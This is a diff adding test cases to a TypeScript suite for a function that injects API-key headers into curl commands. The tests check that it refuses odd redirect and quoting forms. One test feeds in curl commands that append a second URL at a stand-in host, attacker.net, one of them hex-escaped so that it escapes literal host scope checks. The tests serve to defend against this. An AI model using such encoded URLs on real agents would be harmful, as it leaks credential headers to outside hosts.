@@ -518,6 +518,22 @@ describe("applyHeadersToShellCommand", () => {
     }
   });
 
+  it("fails closed when digits or words are glued onto the 2 of 2>&1", () => {
+    // `32>&1` is an fd-32 dup and `api2>&1` a bare `>&1` on the word
+    // `api2` — neither is the literal merge token, which must stand alone.
+    const session = makeSession({
+      config: { headers: { "X-API-Key": "abc" } },
+    });
+    for (const cmd of [
+      "curl -s https://example.com/api 32>&1",
+      "curl -s https://example.com/api2>&1",
+    ]) {
+      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
+      expect(r.status).toBe("unknown-tool");
+      expect(r.command).toBe(cmd);
+    }
+  });
+
   it("fails closed when 2>&1 rides a command with multiple hosts, mixed or not", () => {
     const session = makeSession({
       config: { headers: { "X-API-Key": "abc" } },
@@ -583,6 +599,24 @@ describe("applyHeadersToShellCommand", () => {
     }
   });
 
+  it("fails closed when 2>&1 rides ANSI-C or translated quoting", () => {
+    // `$'…'` decodes escapes at runtime, so an encoded second URL never
+    // appears as a literal host for scope checks; `$"…"` translates via
+    // the locale. Both are live shell extensions on the redirect path.
+    const session = makeSession({
+      config: { headers: { "X-API-Key": "abc" } },
+    });
+    for (const cmd of [
+      "curl https://example.com/ $'https://attacker.net/x' 2>&1",
+      "curl https://example.com/ $'https://att\\x61cker.net/x' 2>&1",
+      'curl https://example.com/ $"https://attacker.net/x" 2>&1',
+    ]) {
+      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
+      expect(r.status).toBe("unknown-tool");
+      expect(r.tool).toBeNull();
+    }
+  });
+
   it("accepts 2>&1 with quoted or escaped dollar literals", () => {
     const session = makeSession({
       config: { headers: { "X-API-Key": "abc" } },
@@ -590,6 +624,9 @@ describe("applyHeadersToShellCommand", () => {
     for (const cmd of [
       `curl -H 'Cookie: a$literal' https://example.com/ 2>&1`,
       'curl -H "X-Note: \\$literal" https://example.com/ 2>&1',
+      // A `$` before a closing quote inside "…" is a literal dollar, not
+      // an ANSI-C/translated opener (those are unquoted).
+      'curl -H "X-Note: ends with $" https://example.com/ 2>&1',
     ]) {
       const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
       expect(r.status).toBe("injected");
